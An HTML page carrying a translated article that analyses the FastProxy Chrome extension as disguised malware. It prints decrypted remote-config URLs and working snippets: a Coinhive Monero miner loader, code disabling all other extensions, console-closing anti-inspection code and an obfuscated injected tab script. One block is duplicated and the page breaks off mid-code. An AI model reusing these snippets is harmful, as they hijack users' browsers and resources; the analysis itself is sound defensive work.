<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>"Viruses" in extensions on the example of FastProxy</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In this article, I will show how dangerous extensions in chrome can be, and how 
 Firefox extensions are safer. 


 It's about expanding FastProxy. 
 ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>"Viruses" in extensions on the example of FastProxy</h1><div class="post__text post__text-html js-mediator-article"><p>  In this article, I will show how dangerous extensions in chrome can be, and how <br>  Firefox extensions are safer. </p><br><p>  It's about expanding FastProxy. <br>  <em>Do not put it in its pure form in chrome.</em> </p><a name="habracut"></a><br><p>  To get its source code, you first need to install another <a href="https://chrome.google.com/webstore/detail/chrome-extension-source-v/jifpbeccnghkjeaalbbjmodiffmgedin">Chrome extension source viewer extension</a> . </p><br><p>  After that <a href="https://chrome.google.com/webstore/detail/fastproxy-%25D0%25BE%25D0%25B1%25D1%2585%25D0%25BE%25D0%25B4-%25D0%25B1%25D0%25BB%25D0%25BE%25D0%25BA%25D0%25B8%25D1%2580%25D0%25BE%25D0%25B2%25D0%25BA/mkelkmkgljeohnaeehnnkmdpocfmkmmf%3Fhl%3Dru">open the page</a> . </p><br><p>  The CRX icon at the same time becomes yellow - click on it and select "download as zip". </p><br><p>  Now to the code analysis. </p><br><h3 id="1-manifest-manifestjson---yadro-lyubogo-rasshireniya">  1. Manifest (manifest.json) - the core of any extension </h3><br><p>  Extension restrictions are set by CSP (content security policy) and permissions: </p><br><blockquote>  "content_security_policy": "script-src 'self' 'unsafe-eval' <a href="https://ssl.google-analytics.com/">https://ssl.google-analytics.com</a> ; object-src 'self'", <br>  "permissions": ["proxy", "tabs", "webRequest", "webRequestBlocking", "management", "\ u003Call_urls&gt;", "storage"], </blockquote><p>  CSP should immediately alert, it allows unsafe-eval (more on this <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src">here</a> ). <br>  Those.  execute code from any given string. </p><br><ul><li> Permission <code>management</code> allows you to manage other extensions. </li><li>  Permission <code>webRequestBlocking</code> allows <code>webRequestBlocking</code> to replace absolutely all requests passing through the browser. </li><li>  Allowing <code>\u003Call_urls&gt;</code> is the same as <code>&lt;all_urls&gt;</code> - allows you to act on any site. </li></ul><br><p>  Read more about permissions <a href="">here</a> . </p><br><p>  Those.  on the basis of only one manifest file, the extension already has a huge level of access to everything. </p><br><p>  Key code files are listed in </p><br><blockquote>  "background": { <br>  "scripts": ["lib.js", "jquery.min.js", "background.js", "ga.js"] <br>  }, </blockquote><p>  They are executed in order in the array immediately after installing the extension or immediately after launching the browser. </p><br><hr><br><h1 id="2-analiz-faylov-fonovogo-processa">  2. Analysis of background process files </h1><br><p>  The code is minimized and confused.  For unraveling, we will use the site <a href="http://jsbeautifier.org/">http://jsbeautifier.org/</a> with default settings. </p><br><ul><li>  I compared the jquery.min.js file with the original jquery 2.2.4 code - they are the same. </li><li>  The ga.js file is simply Google Analytics code. </li><li>  The lib.js file is CryptoJS. </li><li>  The main code is concentrated in background.js. </li></ul><br><p>  To make it much easier to read the code, I rewrote it a bit (renamed functions, changed commas to individual blocks, etc.). <br>  You can also use the firefox version of the same extension to understand the non-essential part of the code. <br>  The use of proxy in firefox and chrome is completely different. </p><br><p>  To download the firefox version of the extension, you need to open the <a href="https://addons.mozilla.org/ru/firefox/addon/fastproxy-%25D1%2580%25D0%25BE%25D1%2581%25D1%2581%25D0%25B8%25D1%258F/">link</a> in firefox. <br>  Copy the link to "Add to Firefox" and open it in chrome. <br>  Open also as a zip archive. </p><br><p>  The rewritten code can be found at <a href="https://github.com/lawlietmester/fastproxy_article/tree/master/Chrome%2520rewrited">this link</a> . </p><br><hr><br><h1 id="3-analiz-backgroundjshttpsgithubcomlawlietmesterfastproxy_articleblobmasterchrome20rewritedbackgroundjs">  3. Analysis <a href="">background.js</a> </h1><br><p>  First of all, you need to understand that <code>$.ajax</code> executed on a file with a script injects this script into the page (in this case, not into the page, but into the background process). </p><br><p>  Guards the lines </p><br><pre> <code class="hljs pgsql">localStorage.C = <span class="hljs-type"><span class="hljs-type">JSON</span></span>.stringify( [ "U2FsdGVkX19b+rGRl3biafMC1rSMejJ/WYMKl4LQUJj9v6z/cHmXINDh2Ugh+q7jo0OGj1IBFtLC0v3Y23luKQ==", "U2FsdGVkX1+poIEChHKgvzBELSP2+vHvotbMSAWxZT53njC5kQ7FzhtsuhRy4F7bHectHXiC6qQzfQEFT7tawQ==" ] );</code> </pre> <br><p>  They already tell us how it is not clear here. </p><br><p>  Add <code>console.log</code> after <code>CryptoJS.AES.decrypt( JSON.parse( localStorage.C)[cc], "config")</code> and <code>CryptoJS.AES.decrypt( JSON.parse(localStorage.P)[pc], "record")</code> , prohibiting the execution of the Ajax themselves. </p><br><p>  At the same time, in the <code>JSON.parse( localStorage.C)[cc]</code> (and the same for record) cc, we change from 0 to 1 (later to 2, when we see arrays of 3 elements). </p><br><p>  Get the links: <br>  for config it </p><br><blockquote>  <a href="http://proxyrus.ru/proxy/config/config.txt%3Fuid%3D1534767152937%26version%3D5.0.4">http://proxyrus.ru/proxy/config/config.txt?uid=1534767152937&amp;version=5.0.4</a> (1) <br>  <a href="http://proxy-fast.ru/proxy/config/config.txt%3Fuid%3D1534767152937%26version%3D5.0.4">http://proxy-fast.ru/proxy/config/config.txt?uid=1534767152937&amp;version=5.0.4</a> (2) </blockquote><p>  for record it </p><br><blockquote>  <a href="http://proxyrus.ru/proxy/config/data.txt%3Fuid%3D1534767152937%26version%3D5.0.4">http://proxyrus.ru/proxy/config/data.txt?uid=1534767152937&amp;version=5.0.4</a> (3) <br>  <a href="http://proxy-fast.ru/proxy/config/data.txt%3Fuid%3D1534767152937%26version%3D5.0.4">http://proxy-fast.ru/proxy/config/data.txt?uid=1534767152937&amp;version=5.0.4</a> (4) </blockquote><p>  And links give data only when used with both parameters uid and version, as well as only through $ .ajax or fetch.  Just opening the browser through the browser does not work - apparently worth checking for incoming headers. </p><br><p>  Now let's get to what these Ajax give.  If you want to read them yourself, better use just fetch in some other project (you will need to install extensions that unlock CORS in the browser). </p><br><h3 id="config_proxyrusrujshttpsgithubcomlawlietmesterfastproxy_articleblobmasterconfig_proxyrusrujs">  <a href="">config_proxyrus.ru.js</a> </h3><br><p>  So, the first link gives us a script that will be automatically embedded in the background process, since  'unsafe-eval' is present, and there are no restrictions on links in the CSP. </p><br><p>  It is worth noting the line </p><br><pre> <code class="hljs actionscript"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">antiZapret</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(tabId, changeInfo, tab)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">typeof</span></span>(tab.url) != <span class="hljs-string"><span class="hljs-string">'undefined'</span></span> &amp;&amp; changeInfo.status == <span class="hljs-string"><span class="hljs-string">'complete'</span></span>) { chrome.tabs.executeScript(tabId,{code: <span class="hljs-string"><span class="hljs-string">"if (document.body.innerText.indexOf(': ') != -1) document.body.innerHTML = '&lt;center style=\"margin-top: 50px; font-size:20px;\"&gt;   .&lt;br&gt;&lt;br&gt;  .&lt;/center&gt;'"</span></span>,runAt:<span class="hljs-string"><span class="hljs-string">"document_start"</span></span>}); }</code> </pre> <br><p>  We drive in the search for "anti-fastproxy proxy" and open the <a href="https://github.com/anticensority/runet-censorship-bypass/wiki/%25D0%2590%25D0%25BB%25D1%258C%25D1%2582%25D0%25B5%25D1%2580%25D0%25BD%25D0%25B0%25D1%2582%25D0%25B8%25D0%25B2%25D1%258B-%25D0%25BD%25D0%25B0%25D1%2588%25D0%25B5%25D0%25BC%25D1%2583-%25D1%2580%25D0%25B0%25D1%2581%25D1%2588%25D0%25B8%25D1%2580%25D0%25B5%25D0%25BD%25D0%25B8%25D1%258E">4th search result</a> , the "Be careful" section. <br>  It turns out that FastProxy does not use its proxy servers. </p><br><h3 id="config_proxy-fastrujshttpsgithubcomlawlietmesterfastproxy_articleblobmasterconfig_proxy-fastrujs">  <a href="">config_proxy-fast.ru.js</a> </h3><br><p>  The second link gives the code similar to the first one, but the script is different! </p><br><pre> <code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">closeWindow</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span> { const <span class="hljs-built_in"><span class="hljs-built_in">time</span></span> = <span class="hljs-number"><span class="hljs-number">500</span></span>; //    setInterval(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span> { //     chrome.tabs.getSelected(null, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(details)</span></span></span></span> { //     id -  <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (details.id == <span class="hljs-number"><span class="hljs-number">-1</span></span>) window.<span class="hljs-built_in"><span class="hljs-built_in">close</span></span>(); }) }, <span class="hljs-built_in"><span class="hljs-built_in">time</span></span>); } closeWindow();</code> </pre> <br><p>  Usually all tabs have an id.  An exception is the tab-window browser console.  Those.  this is protection from spying through the console. </p><br><p>  Also this file contains new URLs, decrypt them using <code>CryptoJS.AES.decrypt( value, "config").toString(CryptoJS.enc.Utf8)</code> and <code>CryptoJS.AES.decrypt( value, "record").toString(CryptoJS.enc.Utf8)</code> . <br>  The first 2 links are the same as the previous ones.  But the third is different: </p><br><blockquote>  <a href="">http://fastproxy.ga/proxy/config/config.txt</a> </blockquote><p>  For 'record', all 3 links are new. </p><br><blockquote>  <a href="">http://proxyrus.ru/proxy/config/data_ru.txt</a> <br>  <a href="">http://proxy-fast.ru/proxy/config/data_ru.txt</a> <br>  <a href="">http://fastproxy.ga/proxy/config/data_ru.txt</a> </blockquote><br><h3 id="config_fastproxygajshttpsgithubcomlawlietmesterfastproxy_articleblobmasterconfig_fastproxygajs">  <a href="">config_fastproxy.ga.js</a> </h3><br><p>  In fact, it does not differ from config_proxy-fast.ru.js </p><br><h3 id="vernyomsya-k-config_proxyrusrujs">  Let's return to config_proxyrus.ru.js </h3><br><p>  The code also contains the closing of the console.  Further interesting begins. </p><br><p>  Line </p><br><pre> <code class="hljs swift"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ext_id = chrome.app.getDetails().id;</code> </pre> <br><p>  gets an extension identifier, and this is an undocumented feature. <br>  Current documentation uses a <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/runtime/id">different method.</a> <br>  Next is the ramification: </p><br><pre> <code class="hljs ruby"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ext_id == <span class="hljs-string"><span class="hljs-string">'beopoifhaiidibmihoignfdkkbmjipha'</span></span> <span class="hljs-params"><span class="hljs-params">||</span></span> ext_id == <span class="hljs-string"><span class="hljs-string">'fcdjcppkancjbpdhemdjhebpomdobibe'</span></span> <span class="hljs-params"><span class="hljs-params">||</span></span> ext_id == <span class="hljs-string"><span class="hljs-string">'ofgklcpjmjllneddlbdagcfjejijgddf'</span></span> <span class="hljs-params"><span class="hljs-params">||</span></span> ext_id == <span class="hljs-string"><span class="hljs-string">'pkmnmcdbmckjkjamjplinbcfajgpdofg'</span></span> <span class="hljs-params"><span class="hljs-params">||</span></span> ext_id == <span class="hljs-string"><span class="hljs-string">'gmepkmkiaabodlcacffkfcebpmoignmn'</span></span>) { localStorage.C = JSON.stringify([<span class="hljs-string"><span class="hljs-string">"U2FsdGVkX18je2+6W662j18jc6bCMixpobVVi0e742xuScVv52oVfAec3mi0r7yzjURlrOmKQ1yPWiL4OMs/H2n46BT2CBWITNt//awcTmo="</span></span>]); localStorage.P = JSON.stringify([<span class="hljs-string"><span class="hljs-string">"U2FsdGVkX18o8IrwuBMWxFqxRKPexumxnA8m8SE4lVdCMADiQkRSZLlx5ve36/XaV6Fo6ZarTXuFTYrpspX9YkwMY9fwEQKBrNpNgtgqDw0="</span></span>]); chrome.runtime.reload(); <span class="hljs-regexp"><span class="hljs-regexp">//</span></span>    } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { localStorage.C = JSON.stringify([ <span class="hljs-string"><span class="hljs-string">"U2FsdGVkX19b+rGRl3biafMC1rSMejJ/WYMKl4LQUJj9v6z/cHmXINDh2Ugh+q7jo0OGj1IBFtLC0v3Y23luKQ=="</span></span>, <span class="hljs-string"><span class="hljs-string">"U2FsdGVkX1+poIEChHKgvzBELSP2+vHvotbMSAWxZT53njC5kQ7FzhtsuhRy4F7bHectHXiC6qQzfQEFT7tawQ=="</span></span>, <span class="hljs-string"><span class="hljs-string">"U2FsdGVkX19KHybcO9+ekVU/z2EbOWZdK42M6O3fdj30yg8Eb/uK2bpDbUCX/GAbhgMzvjOoGx7yBIpbGICjkA=="</span></span>, ]); localStorage.P = JSON.stringify([ <span class="hljs-string"><span class="hljs-string">"U2FsdGVkX1/VY0dOqAXKTY3QGegKeto9s/+UEFgoHQKH6MIbSWJBHk0q4BcEP33AJ6WmoPXpnuVJqlC1Hcg32g=="</span></span>, <span class="hljs-string"><span class="hljs-string">"U2FsdGVkX18iHLmS1gYYFtaRIMMGzvXxkz3y41PdqzDR3CylKy5G/yV3Xoc2SJIBWmxiiDuJVdDBHsPhOhsSpA=="</span></span>, <span class="hljs-string"><span class="hljs-string">"U2FsdGVkX1/JndUDO1bR2np5RROkl1IF4EDQ1BMjjtLumYu6HXCxTWahndHXFKA9IeRfBtFfcdHL1J/NjI+KBA=="</span></span>, ]); }</code> ext_id == 'fcdjcppkancjbpdhemdjhebpomdobibe' || ext_id == 'ofgklcpjmjllneddlbdagcfjejijgddf' || ext_id == 'pkmnmcdbmckjkjamjplinbcfajgpdofg' || ext_id == 'gmepkmkiaabodlcacffkfcebpmoignmn') { <code class="hljs ruby"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ext_id == <span class="hljs-string"><span class="hljs-string">'beopoifhaiidibmihoignfdkkbmjipha'</span></span> <span class="hljs-params"><span class="hljs-params">||</span></span> ext_id == <span class="hljs-string"><span class="hljs-string">'fcdjcppkancjbpdhemdjhebpomdobibe'</span></span> <span class="hljs-params"><span class="hljs-params">||</span></span> ext_id == <span class="hljs-string"><span class="hljs-string">'ofgklcpjmjllneddlbdagcfjejijgddf'</span></span> <span class="hljs-params"><span class="hljs-params">||</span></span> ext_id == <span class="hljs-string"><span class="hljs-string">'pkmnmcdbmckjkjamjplinbcfajgpdofg'</span></span> <span class="hljs-params"><span class="hljs-params">||</span></span> ext_id == <span class="hljs-string"><span class="hljs-string">'gmepkmkiaabodlcacffkfcebpmoignmn'</span></span>) { localStorage.C = JSON.stringify([<span class="hljs-string"><span class="hljs-string">"U2FsdGVkX18je2+6W662j18jc6bCMixpobVVi0e742xuScVv52oVfAec3mi0r7yzjURlrOmKQ1yPWiL4OMs/H2n46BT2CBWITNt//awcTmo="</span></span>]); localStorage.P = JSON.stringify([<span class="hljs-string"><span class="hljs-string">"U2FsdGVkX18o8IrwuBMWxFqxRKPexumxnA8m8SE4lVdCMADiQkRSZLlx5ve36/XaV6Fo6ZarTXuFTYrpspX9YkwMY9fwEQKBrNpNgtgqDw0="</span></span>]); chrome.runtime.reload(); <span class="hljs-regexp"><span class="hljs-regexp">//</span></span>    } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { localStorage.C = JSON.stringify([ <span class="hljs-string"><span class="hljs-string">"U2FsdGVkX19b+rGRl3biafMC1rSMejJ/WYMKl4LQUJj9v6z/cHmXINDh2Ugh+q7jo0OGj1IBFtLC0v3Y23luKQ=="</span></span>, <span class="hljs-string"><span class="hljs-string">"U2FsdGVkX1+poIEChHKgvzBELSP2+vHvotbMSAWxZT53njC5kQ7FzhtsuhRy4F7bHectHXiC6qQzfQEFT7tawQ=="</span></span>, <span class="hljs-string"><span class="hljs-string">"U2FsdGVkX19KHybcO9+ekVU/z2EbOWZdK42M6O3fdj30yg8Eb/uK2bpDbUCX/GAbhgMzvjOoGx7yBIpbGICjkA=="</span></span>, ]); localStorage.P = JSON.stringify([ <span class="hljs-string"><span class="hljs-string">"U2FsdGVkX1/VY0dOqAXKTY3QGegKeto9s/+UEFgoHQKH6MIbSWJBHk0q4BcEP33AJ6WmoPXpnuVJqlC1Hcg32g=="</span></span>, <span class="hljs-string"><span class="hljs-string">"U2FsdGVkX18iHLmS1gYYFtaRIMMGzvXxkz3y41PdqzDR3CylKy5G/yV3Xoc2SJIBWmxiiDuJVdDBHsPhOhsSpA=="</span></span>, <span class="hljs-string"><span class="hljs-string">"U2FsdGVkX1/JndUDO1bR2np5RROkl1IF4EDQ1BMjjtLumYu6HXCxTWahndHXFKA9IeRfBtFfcdHL1J/NjI+KBA=="</span></span>, ]); }</code> </pre> <br><p>  The same three links in case <code>ext_id</code> does not fall into the necessary list of extensions. <br>  And one new link, if it falls into the list of extensions + full reload of the extension. </p><br><p>  If anyone can find out what these extensions were - write in the comments.  There are no matches with the current FastProxy id.  Search through google store does not give anything by their identifiers. </p><br><p>  Decryption of links </p><br><pre> <code class="hljs pgsql">localStorage.C = <span class="hljs-type"><span class="hljs-type">JSON</span></span>.stringify(["U2FsdGVkX18je2+6W662j18jc6bCMixpobVVi0e742xuScVv52oVfAec3mi0r7yzjURlrOmKQ1yPWiL4OMs/H2n46BT2CBWITNt//awcTmo="]); localStorage.P = <span class="hljs-type"><span class="hljs-type">JSON</span></span>.stringify(["U2FsdGVkX18o8IrwuBMWxFqxRKPexumxnA8m8SE4lVdCMADiQkRSZLlx5ve36/XaV6Fo6ZarTXuFTYrpspX9YkwMY9fwEQKBrNpNgtgqDw0="]);</code> </pre> <br><p>  gives </p><br><blockquote>  <a href="">http://prowebdom.ru/update/test/proxy/config/config_ru.js</a> <br>  <a href="">http://prowebdom.ru/update/test/proxy/config/data_ru.pac</a> <br>  which can be opened directly in the browser. </blockquote><br><h3 id="config_prowebdomrujs">  config_prowebdom.ru.js </h3><br><p>  Closing the console again.  And then the most interesting. </p><br><pre> <code class="hljs javascript"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> coin = $.get(<span class="hljs-string"><span class="hljs-string">"https://coinhive.com/lib/coinhive.min.js"</span></span>); coin.done(<span class="hljs-function"><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> =&gt;</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> miner = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> CoinHive.User(<span class="hljs-string"><span class="hljs-string">'aUvlRg4eSsDf6wcFmMZPjQ57JDUUR3IR'</span></span>, <span class="hljs-string"><span class="hljs-string">'FPR'</span></span>, {<span class="hljs-attr"><span class="hljs-attr">autoThreads</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span>}); miner.start(); })</code> </pre> <br><p>  ^ Run the miner Monero.  Remember the way wallet, if you see somewhere in the code is similar - these are the same people. </p><br><pre> <code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">removeAdBlockExtensions</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.chrome.management.getAll(<span class="hljs-function"><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">extensions</span></span></span><span class="hljs-function">) =&gt;</span></span> { extensions.forEach(<span class="hljs-function"><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) =&gt;</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (e.enabled &amp;&amp; e.id != <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.chrome.runtime.id) { <span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.chrome.management.setEnabled(e.id, <span class="hljs-literal"><span class="hljs-literal">false</span></span>); } }); }); } removeAdBlockExtensions();</code> </pre> <br><p>  This code disables all extensions except himself. <br>  If there was no permission for managament, this would not be possible. </p><br><p>  Further </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">chrome</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.tabs</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.onUpdated</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.addListener</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">onUpdatedListenerSearch</span></span>);</code> </pre> <br><p>  and </p><br><pre> <code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onUpdatedListenerSearch</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(tabId, changeInfo, tab)</span></span></span><span class="hljs-function"> { </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">if</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(typeof(tab.url)</span></span></span><span class="hljs-function"> != '</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">undefined</span></span></span><span class="hljs-function">') { </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">var</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ext_id</span></span></span><span class="hljs-function"> = </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">chrome</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">app</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDetails</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">id</span></span></span><span class="hljs-function">; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">if</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(ext_id != 'mkelkmkgljeohnaeehnnkmdpocfmkmmf')</span></span></span><span class="hljs-function"> { </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">if</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(tab.url.indexOf('google')</span></span></span><span class="hljs-function"> == -1) { //             </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">chrome</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">tabs</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">executeScript</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(tabId, {code:"!function()</span></span></span><span class="hljs-function">{</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">var</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">b</span></span></span><span class="hljs-function">={</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a3759370402</span></span></span><span class="hljs-function">:'30022',</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a1072190280</span></span></span><span class="hljs-function">:'{</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">subid</span></span></span><span class="hljs-function">}',</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a2302729239</span></span></span><span class="hljs-function">:</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">JSON</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parse</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">('[\"7a72793462736f702e7275\",\"746b636d36686a762e7275\"]')</span></span></span><span class="hljs-function">},</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">c</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">function</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(h,j,k)</span></span></span><span class="hljs-function">{</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">for</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(var l=[].slice.call(k)</span></span></span><span class="hljs-function">,</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">m</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">h</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">split</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">('.')</span></span></span><span class="hljs-function">,</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">p</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">m</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pop</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">,</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">q</span></span></span><span class="hljs-function">=0;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">q</span></span></span><span class="hljs-function">&lt;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">m</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">length</span></span></span><span class="hljs-function">;</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">q</span></span></span><span class="hljs-function">++)</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">j</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">j</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">[m[q]</span></span></span><span class="hljs-function">];</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">return</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">j</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">[p]</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">apply</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(j,l)</span></span></span><span class="hljs-function">},</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">d</span></span></span><span class="hljs-function">=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">function</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(h)</span></span></span><span class="hljs-function">{</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">if</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(!(h=h.match(/.{1,2}/g)</span></span></span><span class="hljs-function">))</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">return</span></span></span><span class="hljs-function">'';</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">for</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(var j='',k=0;k&lt;h.length;k++)</span></span></span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">j</span></span></span><span class="hljs-function">+=</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">c</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">('fromCharCode',String,[parseInt(h[k],16)</span></span></span><span 